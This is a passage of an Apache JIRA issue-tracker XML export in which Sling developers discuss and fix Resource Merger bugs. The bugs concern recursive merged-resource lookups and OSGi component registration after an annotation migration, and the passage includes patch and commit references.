                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17689629" author="sagarmiglani" created="Thu, 16 Feb 2023 09:07:52 +0000"  >&lt;p&gt;Potential patch: &lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13055506/13055506_SLING-11776.patch&quot; title=&quot;SLING-11776.patch attached to SLING-11776&quot;&gt;SLING-11776.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;</comment>
                            <comment id="17689679" author="cziegeler" created="Thu, 16 Feb 2023 10:21:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; Thanks for the patch; I think the solution is good; it doesn&apos;t make sense to recursively call a merged resource. For the logging, I would prefer either debug or info level - this is not an error that an engineer somehow can fix; it depends on user input.&lt;br/&gt;
Could you maybe also provide a simple test case?&lt;/p&gt;</comment>
                            <comment id="17689765" author="cziegeler" created="Thu, 16 Feb 2023 13:27:25 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; As a first step I applied a slightly modified version of your patch at : &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/043fb8a7ee8194e7b1adab840f603a9da9892bf5&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/043fb8a7ee8194e7b1adab840f603a9da9892bf5&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17689790" author="sagarmiglani" created="Thu, 16 Feb 2023 14:34:55 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt;&#160;&lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13055515/13055515_SLING-11776_test.patch&quot; title=&quot;SLING-11776_test.patch attached to SLING-11776&quot;&gt;SLING-11776_test.patch&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; shows that if merged root was n-times in path, then n-1 times there were calls to &lt;tt&gt;resolver.getResource()&lt;/tt&gt; each time removing one merge root path from start.&lt;/p&gt;

&lt;p&gt;If test looks good, I can raise a PR with test based on new changes.&lt;/p&gt;</comment>
                            <comment id="17689810" author="cziegeler" created="Thu, 16 Feb 2023 15:38:28 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; thanks, yes test looks good. please adjust&lt;/p&gt;</comment>
                            <comment id="17689831" author="cziegeler" created="Thu, 16 Feb 2023 16:18:59 +0000"  >&lt;p&gt;Test from &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; applied in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c1587bfa466bfa5c2666c121a997698aa3dd4a7d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c1587bfa466bfa5c2666c121a997698aa3dd4a7d&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13055506" name="SLING-11776.patch" size="1003" author="sagarmiglani" created="Thu, 16 Feb 2023 09:07:06 +0000"/>
                            <attachment id="13055515" name="SLING-11776_test.patch" size="5773" author="sagarmiglani" created="Thu, 16 Feb 2023 14:32:16 +0000"/>
                            <attachment id="13055507" name="SLING-11776_with_logs.patch" size="1910" author="sagarmiglani" created="Thu, 16 Feb 2023 09:18:23 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>3.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 35 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fz8g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11774] Fix the registration of the MergedResourcePicker2 implementations</title>
                <link>https://issues.apache.org/jira/browse/SLING-11774</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems the improvement from &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10168&quot; title=&quot;Migrate to Bundle Parent 41 and OSGi annotations&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10168&quot;&gt;&lt;del&gt;SLING-10168&lt;/del&gt;&lt;/a&gt; introduced a subtle bug, where the components are registered only based on configuration properties, completely ignoring their default configuration (where applicable).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13524560">SLING-11774</key>
            <summary>Fix the registration of the MergedResourcePicker2 implementations</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="3">Duplicate</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 14 Feb 2023 00:14:57 +0000</created>
                <updated>Wed, 15 Feb 2023 11:15:20 +0000</updated>
                            <resolved>Wed, 15 Feb 2023 11:15:14 +0000</resolved>
                                    <version>Resource Merger 1.4.0</version>
                                                    <component>Extensions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3600">1h</timespent>
                                <comments>
                            <comment id="17688272" author="sagarmiglani" created="Tue, 14 Feb 2023 04:59:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt; Does it look similar to &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11773&quot; title=&quot;ResourceTypeHierarchyBasedResourcePicker not working anymore&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11773&quot;&gt;&lt;del&gt;SLING-11773&lt;/del&gt;&lt;/a&gt; ?&lt;/p&gt;</comment>
                            <comment id="17688345" author="radu.cotescu" created="Tue, 14 Feb 2023 07:46:13 +0000"  >&lt;p&gt;Ha, yes! It&apos;s the same issue. But there&apos;s a bit more to it - in addition to that, when the migration was done, only the configuration properties were passed to the pickers. Before we were also passing the registration properties from the ServiceReference.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                            <outwardlinks description="duplicates">
                                        <issuelink>
            <issuekey id="13524465">SLING-11773</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13361034">SLING-10168</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 36 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fwns:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11773] ResourceTypeHierarchyBasedResourcePicker not working anymore</title>
                <link>https://issues.apache.org/jira/browse/SLING-11773</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10168&quot; title=&quot;Migrate to Bundle Parent 41 and OSGi annotations&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10168&quot;&gt;&lt;del&gt;SLING-10168&lt;/del&gt;&lt;/a&gt;, SCR annotations were replaced by OSGi and configurations of &lt;tt&gt;ResourceTypeHierarchyBasedResourcePicker&lt;/tt&gt; have been designated to an inner Configuration class, which are not getting bind properly without &lt;tt&gt;@Activate&lt;/tt&gt; Method.&lt;/p&gt;

&lt;p&gt;And hence &lt;tt&gt;ResourceTypeHierarchyBasedResourcePicker&lt;/tt&gt; does not seem to be registered by&lt;br/&gt;
&lt;tt&gt;MergedResourcePickerWhiteboard&lt;/tt&gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;.&lt;/p&gt;

&lt;p&gt;Compared generated XMLs:&lt;br/&gt;
&lt;b&gt;With &lt;tt&gt;Activate&lt;/tt&gt; Method injection:&lt;/b&gt;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;?xml version=&lt;span class=&quot;code-quote&quot;&gt;&quot;1.0&quot;&lt;/span&gt; encoding=&lt;span class=&quot;code-quote&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;scr:component &lt;span class=&quot;code-keyword&quot;&gt;xmlns:scr&lt;/span&gt;=&lt;span class=&quot;code-quote&quot;&gt;&quot;http://www.osgi.org/xmlns/scr/v1.3.0&quot;&lt;/span&gt; name=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.picker.overriding&quot;&lt;/span&gt; configuration-policy=&lt;span class=&quot;code-quote&quot;&gt;&quot;require&quot;&lt;/span&gt; activate=&lt;span class=&quot;code-quote&quot;&gt;&quot;activate&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property name=&lt;span class=&quot;code-quote&quot;&gt;&quot;merge.root&quot;&lt;/span&gt; type=&lt;span class=&quot;code-quote&quot;&gt;&quot;String&quot;&lt;/span&gt; value=&lt;span class=&quot;code-quote&quot;&gt;&quot;/mnt/override&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property name=&lt;span class=&quot;code-quote&quot;&gt;&quot;merge.readOnly&quot;&lt;/span&gt; type=&lt;span class=&quot;code-quote&quot;&gt;&quot;Boolean&quot;&lt;/span&gt; value=&lt;span class=&quot;code-quote&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property name=&lt;span class=&quot;code-quote&quot;&gt;&quot;merge.traverseParent&quot;&lt;/span&gt; type=&lt;span class=&quot;code-quote&quot;&gt;&quot;Boolean&quot;&lt;/span&gt; value=&lt;span class=&quot;code-quote&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;service&amp;gt;&lt;/span&gt;
&#160; &#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;provide interface=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.spi.MergedResourcePicker2&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/service&amp;gt;&lt;/span&gt;
&#160; &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;implementation class=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.impl.picker.ResourceTypeHierarchyBasedResourcePicker&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/scr:component&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Without &lt;tt&gt;@Activate&lt;/tt&gt; method injection:&lt;/b&gt;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;?xml version=&lt;span class=&quot;code-quote&quot;&gt;&quot;1.0&quot;&lt;/span&gt; encoding=&lt;span class=&quot;code-quote&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;scr:component &lt;span class=&quot;code-keyword&quot;&gt;xmlns:scr&lt;/span&gt;=&lt;span class=&quot;code-quote&quot;&gt;&quot;http://www.osgi.org/xmlns/scr/v1.3.0&quot;&lt;/span&gt; name=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.picker.overriding&quot;&lt;/span&gt; configuration-policy=&lt;span class=&quot;code-quote&quot;&gt;&quot;require&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property name=&lt;span class=&quot;code-quote&quot;&gt;&quot;merge.traverseParent&quot;&lt;/span&gt; type=&lt;span class=&quot;code-quote&quot;&gt;&quot;Boolean&quot;&lt;/span&gt; value=&lt;span class=&quot;code-quote&quot;&gt;&quot;true&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;service&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;provide interface=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.spi.MergedResourcePicker2&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/service&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;implementation class=&lt;span class=&quot;code-quote&quot;&gt;&quot;org.apache.sling.resourcemerger.impl.picker.ResourceTypeHierarchyBasedResourcePicker&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/scr:component&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/master/src/main/java/org/apache/sling/resourcemerger/impl/MergedResourcePickerWhiteboard.java#L87&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/master/src/main/java/org/apache/sling/resourcemerger/impl/MergedResourcePickerWhiteboard.java#L87&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13524465">SLING-11773</key>
            <summary>ResourceTypeHierarchyBasedResourcePicker not working anymore</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Mon, 13 Feb 2023 11:56:30 +0000</created>
                <updated>Fri, 17 Mar 2023 15:02:48 +0000</updated>
                            <resolved>Tue, 14 Feb 2023 10:58:37 +0000</resolved>
                                    <version>Resource Merger 1.4.0</version>
                                    <fixVersion>Resource Merger 1.4.2</fixVersion>
                                    <component>Extensions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>5</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3600">1h</timespent>
                                <comments>
                            <comment id="17687911" author="kwin" created="Mon, 13 Feb 2023 12:25:08 +0000"  >&lt;p&gt;That sounds like a bug in the underlying bnd library. &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sagarmiglani&quot; class=&quot;user-hover&quot; rel=&quot;sagarmiglani&quot;&gt;sagarmiglani&lt;/a&gt; Can you try upgrading to the latest parent instead to see if this fixes it? Otherwise would be good to report a bug at &lt;a href=&quot;https://github.com/bndtools/bnd/issues/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/bndtools/bnd/issues/&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17687945" author="cziegeler" created="Mon, 13 Feb 2023 13:49:08 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt; I don&apos;t think this is a bnd bug. There is no instruction (annotation) in the class instructing bnd to generate properties. Only the usage in a lifecycle method does this. The used annotations are purely for metatype.&lt;/p&gt;</comment>
                            <comment id="17687971" author="kwin" created="Mon, 13 Feb 2023 14:53:32 +0000"  >&lt;p&gt;I was assuming the &lt;tt&gt;@Designate&lt;/tt&gt; annotation clearly connects them metatype with the DS component (&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/186043d052c4a25553cde99d3b55e630bc6bc062/src/main/java/org/apache/sling/resourcemerger/impl/picker/ResourceTypeHierarchyBasedResourcePicker.java#L39).&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/blob/186043d052c4a25553cde99d3b55e630bc6bc062/src/main/java/org/apache/sling/resourcemerger/impl/picker/ResourceTypeHierarchyBasedResourcePicker.java#L39).&lt;/a&gt; But you are right, according to &lt;a href=&quot;https://docs.osgi.org/specification/osgi.cmpn/8.0.0/service.component.html#service.component-ordering.generated.properties:&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://docs.osgi.org/specification/osgi.cmpn/8.0.0/service.component.html#service.component-ordering.generated.properties:&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Only&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Properties defined through component property types used as the type of an activation object.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Properties defined through component property types annotating the component implementation class.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;end up as component properties.&lt;/p&gt;</comment>
                            <comment id="17688346" author="radu.cotescu" created="Tue, 14 Feb 2023 07:48:01 +0000"  >&lt;p&gt;There&apos;s an additional issue though. With the migration, the components are registered only based on the configuration properties. The registration properties are ignored. See &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11774&quot; title=&quot;Fix the registration of the MergedResourcePicker2 implementations&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11774&quot;&gt;&lt;del&gt;SLING-11774&lt;/del&gt;&lt;/a&gt;. I already have a fix that I&apos;m testing, haven&apos;t committed it yet.&lt;/p&gt;

&lt;p&gt;Regarding&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;That sounds like a bug in the underlying bnd library.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I had thought the same and updated to the latest parent pom, but then I figured out that the default service registration properties were generated. If you look at the other picker, its component properties are generated due to the use of the configuration in the activate method.&lt;/p&gt;</comment>
                            <comment id="17688450" author="radu.cotescu" created="Tue, 14 Feb 2023 10:58:37 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c8c05f1c72d5269b8453c7539d4c33824755f61a&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourcemerger/commit/c8c05f1c72d5269b8453c7539d4c33824755f61a&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13524560">SLING-11774</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13361034">SLING-10168</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 36 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fw2o:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11768] Display Context &quot;scriptString&quot; encodes hyphen (-) as \u002D</title>
